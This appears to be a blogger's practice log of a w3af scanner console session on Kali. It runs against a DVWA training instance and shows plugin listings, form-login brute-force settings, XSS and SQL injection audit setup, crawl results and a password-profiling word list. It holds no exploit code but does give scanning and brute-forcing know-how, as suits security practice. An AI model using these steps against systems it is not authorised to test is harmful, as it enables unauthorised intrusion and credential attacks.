allowed methods of || | | | an URL. || archiveDotOrg | | Yes | Search archive.org to find new || | | | pages in the target site. || bing_spider | | Yes | Search Bing to get a list of new || | | | URLs || content_negotiation | | Yes | Use content negotiation to find || | | | new resources. || detectReverseProxy | | | Find out if the remote web || | | | server has a reverse proxy. || detectTransparentProxy | | | Find out if your ISP has a || | | | transparent proxy installed. || digitSum | | Yes | Take an URL with a number ( || | | | index2.asp ) and try to find || | | | related files (index1.asp, || | | | index3.asp). || dir_bruter | | Yes | Finds Web server directories by || | | | bruteforcing. || dnsWildcard | | | Find out if www.site.com and || | | | site.com return the same page. || domain_dot | | | Send a specially crafted request || | | | with a dot after the domain || | | | (http://host.tld./) and analyze || | | | response. || dotNetErrors | | | Request specially crafted URLs || | | | that generate ASP.NET errors in || | | | order to gather information. || favicon_identification | | | Identify server software using || | | | favicon. || findBackdoor | | | Find web backdoors and web || | | | shells. || findCaptchas | | | Identify captcha images on web || | | | pages. || findDVCS | | | Find GIT, Mercurial (HG), and || | | | Bazaar (BZR) repositories || findGit | | | Find GIT repositories || findvhost | | | Modify the HTTP Host header and || | | | try to find virtual hosts. || fingerBing | | Yes | Search Bing to get a list of || | | | users for a domain. || fingerGoogle | | Yes | Search Google using the Google || | | | API to get a list of users for a || | | | domain. || fingerPKS | | | Search MIT PKS to get a list of || | | | users for a domain. || fingerprint_WAF | | | Identify if a Web Application || | | | Firewall is present and if || | | | possible identify the vendor and || | | | version. || fingerprint_os | | | Fingerprint the remote operating || | | | system using the HTTP protocol. || frontpage_version | | | Search FrontPage Server Info || | | | file and if it finds it will || | | | determine its version. || ghdb | | Yes | Search Google for || | | | vulnerabilities in the target || | | | site. || googleSpider | | Yes | Search google using google API || | | | to get new URLs || halberd | | | Identify if the remote server || | | | has HTTP load balancers. || hmap | | Yes | Fingerprint the server type, i.e || | | | apache, iis, tomcat, etc. || http_vs_https_dist | | Yes | Determines the network distance || | | | between the http and https ports || | | | for a target. || importResults | | Yes | Import URLs found by other || | | | tools. || oracleDiscovery | | | Find Oracle applications on the || | | | remote web server. || phishtank | | Yes | Search the phishtank.com || | | | database to determine if your || | | | server is (or was) being used in || | | | phishing scams. || phpEggs | | | Fingerprint the PHP version || | | | using documented easter eggs || | | | that exist in PHP. || phpinfo | | | Search PHP Info file and if it || | | | finds it will determine the || | | | version of PHP. || pykto | | Yes | A nikto port to python. || ria_enumerator | | Yes | Fingerprint Rich Internet Apps - || | | | Google Gears Manifest files, || | | | Silverlight and Flash. || robotsReader | | | Analyze the robots.txt file and || | | | find new URLs || serverHeader | | Yes | Identify the server type based || | | | on the server header. || serverStatus | | | Find new URLs from the Apache || | | | server-status cgi. || sharedHosting | | Yes | Use Bing search to determine if || | | | the website is in a shared || | | | hosting. || sitemapReader | | | Analyze the sitemap.xml file and || | | | find new URLs || slash | | | Identify if the resource || | | | http://host.tld/spam/ and || | | | http://host.tld/spam are the || | | | same. || spiderMan | | Yes | SpiderMan is a local proxy that || | | | will collect new URLs. || urlFuzzer | | Yes | Try to find backups, and other || | | | related files. || urllist_txt | | | Analyze the urllist.txt file and || | | | find new URLs || userDir | | Yes | Try to find user directories || | | | like &quot;http://test/~user/&quot; and || | | | identify the remote OS based on || | | | the remote users. || webDiff | | Yes | Compare a local directory with a || | | | remote URL path. || webSpider | | Yes | Crawl the web application. || wordnet | | Yes | Use the wordnet lexical database || | | | to find new URLs. || wordpress_fingerprint | | | Finds the version of a WordPress || | | | installation. || wsdlFinder | | | Find web service definitions || | | | files. || xssedDotCom | | | Search in xssed.com to find || | | | xssed pages. || yahooSiteExplorer | | Yes | Search Yahoo&apos;s index using Yahoo || | | | site explorer to get a list of || | | | URLs || zone_h | | | Find out if the site was defaced || | | | in the past. ||---------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; bruteforce|----------------------------------------------------------------------------|| Plugin name | Status | Conf | Description ||----------------------------------------------------------------------------|| basicAuthBrute | | Yes | Bruteforce HTTP basic authentication. || formAuthBrute | | Yes | Bruteforce HTML form authentication. ||----------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; bruteforce formAuthBrutew3af/plugins&gt;&gt;&gt; bruteforce config formAuthBrutew3af/plugins/bruteforce/config:formAuthBrute&gt;&gt;&gt; set passwdFile truew3af/plugins/bruteforce/config:formAuthBrute&gt;&gt;&gt; set usersFile Truew3af/plugins/bruteforce/config:formAuthBrute&gt;&gt;&gt; backw3af/plugins&gt;&gt;&gt; audit xss,sqliw3af/plugins&gt;&gt;&gt; discovery webSpiderw3af/plugins&gt;&gt;&gt; discovery config webSpider w3af/plugins/discovery/config:webSpider&gt;&gt;&gt; set onlyForward Truew3af/plugins/discovery/config:webSpider&gt;&gt;&gt; backw3af/plugins&gt;&gt;&gt; targetUnknown command &apos;target&apos;w3af/plugins&gt;&gt;&gt; backw3af&gt;&gt;&gt; targetw3af/config:target&gt;&gt;&gt; set target http://www.dvssc.com/dvwa/index.phpw3af/config:target&gt;&gt;&gt; backw3af&gt;&gt;&gt; pluginsw3af/plugins&gt;&gt;&gt; output htmlFilew3af/plugins&gt;&gt;&gt; output config htmlFilew3af/plugins/output/config:htmlFile&gt;&gt;&gt; set verbose Truew3af/plugins/output/config:htmlFile&gt;&gt;&gt; set fileName aa.htmlw3af/plugins/output/config:htmlFile&gt;&gt;&gt; backw3af/plugins&gt;&gt;&gt; backw3af&gt;&gt;&gt; startAuto-enabling plugin: grep.error500Auto-enabling plugin: grep.passwordProfilingAuto-enabling plugin: grep.getMailsAuto-enabling plugin: grep.httpAuthDetectAuto-enabling plugin: grep.langNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/login_logo.pngNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/New URL found by webSpider plugin: http://www.dvssc.com/dvwa/login.phpNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/css/login.cssThe page language is: enNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/css/New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/css/help.cssNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/css/source.cssNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/js/New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/css/main.cssNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/RandomStorm.pngNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/warning.pngNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/lock.pngNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/dollar.pngNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/js/dvwaPage.jsNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/DBMS/New URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/spanner.pngNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/dvwaPhpIds.inc.phpNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/images/logo.pngNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/dvwaPage.inc.phpNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/DBMS/MySQL.phpNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/DBMS/DBMS.phpNew URL found by webSpider plugin: http://www.dvssc.com/dvwa/dvwa/includes/DBMS/PGSQL.phpStarting formAuthBrute plugin execution.Cant open True file.Found 26 URLs and 59 different points of injection.The list of URLs is:- http://www.dvssc.com/dvwa/login.php- http://www.dvssc.com/dvwa/dvwa/images/login_logo.png- http://www.dvssc.com/dvwa/index.php- http://www.dvssc.com/dvwa/- http://www.dvssc.com/dvwa/dvwa/css/login.css- http://www.dvssc.com/dvwa/dvwa/css/help.css- http://www.dvssc.com/dvwa/dvwa/- http://www.dvssc.com/dvwa/dvwa/css/- http://www.dvssc.com/dvwa/dvwa/css/source.css- http://www.dvssc.com/dvwa/dvwa/includes/- http://www.dvssc.com/dvwa/dvwa/js/- http://www.dvssc.com/dvwa/dvwa/css/main.css- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/MySQL.php- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/DBMS.php- http://www.dvssc.com/dvwa/dvwa/images/- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/PGSQL.php- http://www.dvssc.com/dvwa/dvwa/images/RandomStorm.png- http://www.dvssc.com/dvwa/dvwa/images/warning.png- http://www.dvssc.com/dvwa/dvwa/images/lock.png- http://www.dvssc.com/dvwa/dvwa/images/dollar.png- http://www.dvssc.com/dvwa/dvwa/js/dvwaPage.js- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/- http://www.dvssc.com/dvwa/dvwa/images/spanner.png- http://www.dvssc.com/dvwa/dvwa/includes/dvwaPhpIds.inc.php- http://www.dvssc.com/dvwa/dvwa/images/logo.png- http://www.dvssc.com/dvwa/dvwa/includes/dvwaPage.inc.phpThe list of fuzzable requests is:- http://www.dvssc.com/dvwa/ | Method: GET- http://www.dvssc.com/dvwa/dvwa/ | Method: GET- http://www.dvssc.com/dvwa/dvwa/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;D&quot;)- http://www.dvssc.com/dvwa/dvwa/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)- http://www.dvssc.com/dvwa/dvwa/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;D&quot;)- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)- http://www.dvssc.com/dvwa/dvwa/css/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/css/help.css | Method: GET- http://www.dvssc.com/dvwa/dvwa/css/login.css | Method: GET- http://www.dvssc.com/dvwa/dvwa/css/main.css | Method: GET- http://www.dvssc.com/dvwa/dvwa/css/source.css | Method: GET- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/images/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;D&quot;)- http://www.dvssc.com/dvwa/dvwa/images/RandomStorm.png | Method: GET- http://www.dvssc.com/dvwa/dvwa/images/dollar.png | Method: GET- http://www.dvssc.com/dvwa/dvwa/images/lock.png | Method: GET- http://www.dvssc.com/dvwa/dvwa/images/login_logo.png | Method: GET- http://www.dvssc.com/dvwa/dvwa/images/logo.png | Method: GET- http://www.dvssc.com/dvwa/dvwa/images/spanner.png | Method: GET- http://www.dvssc.com/dvwa/dvwa/images/warning.png | Method: GET- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)- http://www.dvssc.com/dvwa/dvwa/includes/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;D&quot;)- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/DBMS.php | Method: GET- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/MySQL.php | Method: GET- http://www.dvssc.com/dvwa/dvwa/includes/DBMS/PGSQL.php | Method: GET- http://www.dvssc.com/dvwa/dvwa/includes/dvwaPage.inc.php | Method: GET- http://www.dvssc.com/dvwa/dvwa/includes/dvwaPhpIds.inc.php | Method: GET- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET | Parameters: (C=&quot;D&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET | Parameters: (C=&quot;M&quot;, O=&quot;D&quot;)- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET | Parameters: (C=&quot;N&quot;, O=&quot;D&quot;)- http://www.dvssc.com/dvwa/dvwa/js/ | Method: GET | Parameters: (C=&quot;S&quot;, O=&quot;A&quot;)- http://www.dvssc.com/dvwa/dvwa/js/dvwaPage.js | Method: GET- http://www.dvssc.com/dvwa/index.php | Method: GET- http://www.dvssc.com/dvwa/login.php | Method: GET- http://www.dvssc.com/dvwa/login.php | Method: POST | Parameters: (username=&quot;&quot;, password=&quot;&quot;)An unidentified web application error (HTTP response code 500) was found at: &quot;http://www.dvssc.com/dvwa/dvwa/includes/DBMS/MySQL.php&quot;. Enable all plugins and try again, if the vulnerability still is not identified, please verify mannually and report it to the w3af developers. This vulnerability was found in the request with id 181.An unidentified web application error (HTTP response code 500) was found at: &quot;http://www.dvssc.com/dvwa/dvwa/includes/DBMS/PGSQL.php&quot;. Enable all plugins and try again, if the vulnerability still is not identified, please verify mannually and report it to the w3af developers. This vulnerability was found in the request with id 185.Password profiling TOP 100:- [1] Name with 402 repetitions.- [2] Parent with 400 repetitions.- [3] Last with 400 repetitions.- [4] modified with 400 repetitions.- [5] Size with 400 repetitions.- [6] Description with 400 repetitions.- [7] Damn with 168 repetitions.- [8] DVWA with 168 repetitions.- [9] Vulnerable with 168 repetitions.- [10] Login with 140 repetitions.- [11] dvwaPage with 126 repetitions.- [12] RandomStorm with 119 repetitions.- [13] images with 91 repetitions.- [14] help with 74 repetitions.- [15] MySQL with 74 repetitions.- [16] main with 74 repetitions.- [17] login with 74 repetitions.- [18] PGSQL with 74 repetitions.- [19] color with 66 repetitions.- [20] spanner with 63 repetitions.- [21] DBMS with 63 repetitions.- [22] lock with 63 repetitions.- [23] dvwaPhpIds with 63 repetitions.- [24] logo with 63 repetitions.- [25] includes with 63 repetitions.- [26] dollar with 63 repetitions.- [27] source with 62 repetitions.- [28] border with 56 repetitions.- [29] font with 48 repetitions.- [30] padding with 48 repetitions.- [31] 10px with 44 repetitions.- [32] margin with 44 repetitions.- [33] background with 40 repetitions.- [34] align with 38 repetitions.- [35] Application with 28 repetitions.- [36] Username with 28 repetitions.- [37] width with 28 repetitions.- [38] OpenSource with 28 repetitions.- [39] project with 28 repetitions.- [40] Password with 28 repetitions.- [41] size with 26 repetitions.- [42] bottom with 24 repetitions.- [43] 20px with 24 repetitions.- [44] solid with 22 repetitions.- [45] left with 22 repetitions.- [46] style with 18 repetitions.- [47] text with 16 repetitions.- [48] right with 16 repetitions.- [49] 13px with 14 repetitions.- [50] height with 12 repetitions.- [51] none with 12 repetitions.- [52] 15px with 12 repetitions.- [53] sans with 10 repetitions.- [54] D2D4D4 with 10 repetitions.- [55] body with 10 repetitions.- [56] float with 10 repetitions.- [57] serif with 10 repetitions.- [58] false with 10 repetitions.- [59] Arial with 8 repetitions.- [60] Helvetica with 8 repetitions.- [61] weight with 8 repetitions.- [62] bold with 8 repetitions.- [63] span with 8 repetitions.- [64] 6B778C with 8 repetitions.- [65] decoration with 8 repetitions.- [66] f8fafa with 8 repetitions.- [67] 758DAE with 8 repetitions.- [68] return with 8 repetitions.- [69] e7e7e7 with 6 repetitions.- [70] hidden with 6 repetitions.- [71] hover with 6 repetitions.- [72] 12px with 6 repetitions.- [73] container with 6 repetitions.- [74] selected with 6 repetitions.- [75] family with 6 repetitions.- [76] C0C0C0 with 6 repetitions.- [77] function with 6 repetitions.- [78] overflow with 6 repetitions.- [79] f4f4f4 with 6 repetitions.- [80] 2f2f2f with 6 repetitions.- [81] code with 4 repetitions.- [82] focus with 4 repetitions.- [83] with with 4 repetitions.- [84] 25px with 4 repetitions.- [85] input with 4 repetitions.- [86] auto with 4 repetitions.- [87] thisform with 4 repetitions.- [88] F9F7ED with 4 repetitions.- [89] form with 4 repetitions.- [90] C3D9FF with 4 repetitions.- [91] txtName with 4 repetitions.- [92] 99cc33 with 4 repetitions.- [93] area with 4 repetitions.- [94] alerttxt with 4 repetitions.- [95] mtxMessage with 4 repetitions.- [96] A1CC33 with 4 repetitions.- [97] empty with 4 repetitions.- [98] 30px with 4 repetitions.- [99] ffffff with 4 repetitions.- [100] value with 4 repetitions.Scan finished in 14 seconds.w3af&gt;&gt;&gt; 这是在Kali中的一次操作，相对比较完整 这是我自己的操作记录，同时也掌握了相关信息的设置root@kali:/usr/share/w3af# ./w3af_consolew3af&gt;&gt;&gt; help|-----------------------------------------------------------------------------|| start | Start the scan. || plugins | Enable and configure plugins. || exploit | Exploit the vulnerability. || profiles | List and use scan profiles. || cleanup | Cleanup before starting a new scan. ||-----------------------------------------------------------------------------|| help | Display help. Issuing: help [command] , prints more || | specific help about &quot;command&quot; || version | Show w3af version information. || keys | Display key shortcuts. ||-----------------------------------------------------------------------------|| http-settings | Configure the HTTP settings of the framework. || misc-settings | Configure w3af misc settings. || target | Configure the target URL. ||-----------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------|| kb | Browse the vulnerabilities stored in the Knowledge Base ||-----------------------------------------------------------------------------|w3af&gt;&gt;&gt; pluginsw3af/plugins&gt;&gt;&gt; viewUnknown command &apos;view&apos;w3af/plugins&gt;&gt;&gt; help|-----------------------------------------------------------------------------|| list | List available plugins. ||-----------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------|| auth | View, configure and enable auth plugins || grep | View, configure and enable grep plugins || evasion | View, configure and enable evasion plugins || mangle | View, configure and enable mangle plugins || crawl | View, configure and enable crawl plugins || bruteforce | View, configure and enable bruteforce plugins || audit | View, configure and enable audit plugins || infrastructure | View, configure and enable infrastructure plugins || output | View, configure and enable output plugins ||-----------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; auth|----------------------------------------------------------------------------|| Plugin name | Status | Conf | Description ||----------------------------------------------------------------------------|| detailed | | Yes | Detailed authentication plugin. || generic | | Yes | Generic authentication plugin. ||----------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; bruteforce |---------------------------------------------------------------------------|| Plugin name | Status | Conf | Description ||---------------------------------------------------------------------------|| basic_auth | | Yes | Bruteforce HTTP basic authentication. || form_auth | | Yes | Bruteforce HTML form authentication. ||---------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; bruteforce basic_auth,form_auth w3af/plugins&gt;&gt;&gt; bruteforce |----------------------------------------------------------------------------|| Plugin name | Status | Conf | Description ||----------------------------------------------------------------------------|| basic_auth | Enabled | Yes | Bruteforce HTTP basic authentication. || form_auth | Enabled | Yes | Bruteforce HTML form authentication. ||----------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; help|-----------------------------------------------------------------------------|| list | List available plugins. ||-----------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------|| auth | View, configure and enable auth plugins || grep | View, configure and enable grep plugins || evasion | View, configure and enable evasion plugins || mangle | View, configure and enable mangle plugins || crawl | View, configure and enable crawl plugins || bruteforce | View, configure and enable bruteforce plugins || audit | View, configure and enable audit plugins || infrastructure | View, configure and enable infrastructure plugins || output | View, configure and enable output plugins ||-----------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; bruteforce config form_authw3af/plugins/bruteforce/config:form_auth&gt;&gt;&gt; view|-----------------------------------------------------------------------------|| Setting | Value | Modified | Description ||-----------------------------------------------------------------------------|| profilingNumber | 50 | | This || | | | indicates || | | | how many || | | | passwords || | | | from || | | | profiling || | | | will be || | | | used. || useLeetPasswd | True | | This || | | | indicates if || | | | the || | | | bruteforce || | | | should try || | | | l337 || | | | passwords || useProfiling | True | | This || | | | indicates if || | | | the || | | | bruteforce || | | | should use || | | | password || | | | profiling to || | | | collect new || | | | passwords. || useEmails | True | | This || | | | indicates if || | | | the || | | | bruteforcer || | | | should use || | | | emails || | | | collected by || | | | w3af plugins || | | | as users. || comboSeparator | : | | Separator || | | | string used || | | | in Combo || | | | file to || | | | split || | | | username and || | | | password || passEqUser | True | | This || | | | indicates if || | | | the || | | | bruteforce || | | | should try || | | | password || | | | equal user || | | | in logins. || passwdFile | w3af/core/controllers/bruteforce/passwords.txt | | Passwords || | | | file to use || | | | in || | | | bruteforcing || comboFile | w3af/core/controllers/bruteforce/combo.txt | | Combo of || | | | username and || | | | passord, || | | | file to use || | | | in || | | | bruteforcing || usersFile | w3af/core/controllers/bruteforce/users.txt | | Users file || | | | to use in || | | | bruteforcing || stopOnFirst | True | | This || | | | indicates if || | | | the || | | | bruteforce || | | | should stop || | | | after || | | | finding the || | | | first || | | | correct user || | | | and || | | | password. || useSvnUsers | True | | This || | | | indicates if || | | | we will use || | | | usernames || | | | from SVN || | | | headers || | | | collected by || | | | w3af plugins || | | | in || | | | bruteforce. ||-----------------------------------------------------------------------------|w3af/plugins/bruteforce/config:form_auth&gt;&gt;&gt; view|-----------------------------------------------------------------------------------------------------------------------------------------|| Setting | Value | Modified | Description ||-----------------------------------------------------------------------------------------------------------------------------------------|| profilingNumber | 50 | | This indicates how many passwords from profiling will be || | | | used. || useLeetPasswd | True | | This indicates if the bruteforce should try l337 || | | | passwords || useProfiling | True | | This indicates if the bruteforce should use password || | | | profiling to collect new passwords. || useEmails | True | | This indicates if the bruteforcer should use emails || | | | collected by w3af plugins as users. || comboSeparator | : | | Separator string used in Combo file to split username and || | | | password || passEqUser | True | | This indicates if the bruteforce should try password || | | | equal user in logins. || passwdFile | w3af/core/controllers/bruteforce/passwords.txt | | Passwords file to use in bruteforcing || comboFile | w3af/core/controllers/bruteforce/combo.txt | | Combo of username and passord, file to use in || | | | bruteforcing || usersFile | w3af/core/controllers/bruteforce/users.txt | | Users file to use in bruteforcing || stopOnFirst | True | | This indicates if the bruteforce should stop after || | | | finding the first correct user and password. || useSvnUsers | True | | This indicates if we will use usernames from SVN headers || | | | collected by w3af plugins in bruteforce. ||-----------------------------------------------------------------------------------------------------------------------------------------|w3af/plugins/bruteforce/config:form_auth&gt;&gt;&gt; backThe configuration has been saved.w3af/plugins&gt;&gt;&gt; audit|----------------------------------------------------------------------------------------------------------------------------------------|| Plugin name | Status | Conf | Description ||----------------------------------------------------------------------------------------------------------------------------------------|| blind_sqli | | Yes | Identify blind SQL injection vulnerabilities. || buffer_overflow | | | Find buffer overflow vulnerabilities. || cors_origin | | Yes | Inspect if application checks that the value of the &quot;Origin&quot; HTTP header isconsistent with the || | | | value of the remote IP address/Host of the sender ofthe incoming HTTP request. || csrf | | | Identify Cross-Site Request Forgery vulnerabilities. || dav | | | Verify if the WebDAV module is properly configured. || eval | | Yes | Find insecure eval() usage. || file_upload | | Yes | Uploads a file and then searches for the file inside all known directories. || format_string | | | Find format string vulnerabilities. || frontpage | | | Tries to upload a file using frontpage extensions (author.dll). || generic | | Yes | Find all kind of bugs without using a fixed database of errors. || global_redirect | | | Find scripts that redirect the browser to any site. || htaccess_methods | | | Find misconfigurations in Apache&apos;s &quot;&lt;LIMIT&gt;&quot; configuration. || ldapi | | | Find LDAP injection bugs. || lfi | | | Find local file inclusion vulnerabilities. || memcachei | | | No description available for this plugin. || mx_injection | | | Find MX injection vulnerabilities. || os_commanding | | | Find OS Commanding vulnerabilities. || phishing_vector | | | Find phishing vectors. || preg_replace | | | Find unsafe usage of PHPs preg_replace. || redos | | | Find ReDoS vulnerabilities. || response_splitting | | | Find response splitting vulnerabilities. || rfd | | | Identify reflected file download vulnerabilities. || rfi | | Yes | Find remote file inclusion vulnerabilities. || shell_shock | | | Find shell shock vulnerabilities. || sqli | | | Find SQL injection bugs. || ssi | | | Find server side inclusion vulnerabilities. || ssl_certificate | | Yes | Check the SSL certificate validity (if https is being used). || un_ssl | | | Find out if secure content can also be fetched using http. || xpath | | | Find XPATH injection vulnerabilities. || xss | | Yes | Identify cross site scripting vulnerabilities. || xst | | | Find Cross Site Tracing vulnerabilities. ||----------------------------------------------------------------------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; audit xss,sqliw3af/plugins&gt;&gt;&gt; help|-----------------------------------------------------------------------------------------------------------------------------------------|| list | List available plugins. ||-----------------------------------------------------------------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------------------------------------------------------------|| auth | View, configure and enable auth plugins || grep | View, configure and enable grep plugins || evasion | View, configure and enable evasion plugins || mangle | View, configure and enable mangle plugins || crawl | View, configure and enable crawl plugins || bruteforce | View, configure and enable bruteforce plugins || audit | View, configure and enable audit plugins || infrastructure | View, configure and enable infrastructure plugins || output | View, configure and enable output plugins ||-----------------------------------------------------------------------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; crawl |-----------------------------------------------------------------------------------------------------------------------------------------|| Plugin name | Status | Conf | Description ||-----------------------------------------------------------------------------------------------------------------------------------------|| archive_dot_org | | Yes | Search archive.org to find new pages in the target site. || bing_spider | | Yes | Search Bing to get a list of new URLs || content_negotiation | | Yes | Use content negotiation to find new resources. || digit_sum | | Yes | Take an URL with a number (index2.asp) and try to find related files(index1.asp, || | | | index3.asp). || dir_file_bruter | | Yes | Finds Web server directories and files by bruteforcing. || dot_listing | | | Search for .listing files and extracts new filenames from it. || find_backdoors | | | Find web backdoors and web shells. || find_captchas | | | Identify captcha images on web pages. || find_dvcs | | | Search Git, Mercurial (HG), Bazaar (BZR), Subversion (SVN) and CVSrepositories and || | | | checks for files containing || genexus_xml | | | Analyze the execute.xml and DeveloperMenu.xml files and find new URLs || ghdb | | Yes | Search Google for vulnerabilities in the target site. || google_spider | | Yes | Search google using google API to get new URLs || import_results | | Yes | Import URLs found by other tools. || oracle_discovery | | | Find Oracle applications on the remote web server. || phishtank | | | Search the phishtank.com database to determine if your server is (or was)being used in || | | | phishing scams. || phpinfo | | | Search PHP Info file and if it finds it will determine the version of PHP. || pykto | | Yes | A nikto port to python. || ria_enumerator | | Yes | Fingerprint Rich Internet Apps - Google Gears Manifest files, Silverlight and Flash. || robots_txt | | | Analyze the robots.txt file and find new URLs || sitemap_xml | | | Analyze the sitemap.xml file and find new URLs || spider_man | | Yes | SpiderMan is a local proxy that will collect new URLs. || url_fuzzer | | Yes | Try to find backups, and other related files. || urllist_txt | | | Analyze the urllist.txt file and find new URLs || user_dir | | | Identify user directories like &quot;http://test/~user/&quot; and infer the remote OS. || web_diff | | Yes | Compare a local directory with a remote URL path. || web_spider | | Yes | Crawl the web application. || wordnet | | Yes | Use the wordnet lexical database to find new URLs. || wordpress_enumerate_users | | | Finds users in a WordPress installation. || wordpress_fingerprint | | | Finds the version of a WordPress installation. || wordpress_fullpathdisclosure | | | Try to find the path where the WordPress is installed || wsdl_finder | | | Find web service definitions files. ||-----------------------------------------------------------------------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; crawl web_spider w3af/plugins&gt;&gt;&gt; crawl config web_spiderw3af/plugins/crawl/config:web_spider&gt;&gt;&gt; view|----------------------------------------------------------------------------------------------------------------------------------------|| Setting | Value | Modified | Description ||----------------------------------------------------------------------------------------------------------------------------------------|| only_forward | False | | When crawling only follow links to paths inside the one given as target. || ignore_regex | | | When crawling, DO NOT follow links that match this regular expression. Please note that ignore_regex || | | | has precedence over follow_regex. || 